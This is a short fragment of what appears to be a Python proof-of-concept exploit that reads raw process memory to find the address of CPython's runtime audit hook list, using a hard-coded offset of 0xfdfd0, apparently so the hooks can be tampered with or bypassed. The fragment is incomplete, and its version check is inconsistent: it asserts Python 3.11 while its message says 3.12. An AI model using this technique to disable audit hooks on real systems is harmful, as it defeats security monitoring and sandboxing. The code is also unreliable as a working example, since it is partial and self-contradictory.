...
assert sys.version_info[:2] == (3, 11), "This POC is for Python 3.12 only"
...
ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') + 24

# by
# from audit_hook_head_finder import get_runtime_audit_hook_ptr_addr
# # should be offset= 0xfdfd0
# print("offset=", hex(get_runtime_audit_hook_ptr_addr() - int.from_bytes(memory[ptr:ptr + 8], 'little')))

ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') + 0xfdfd0
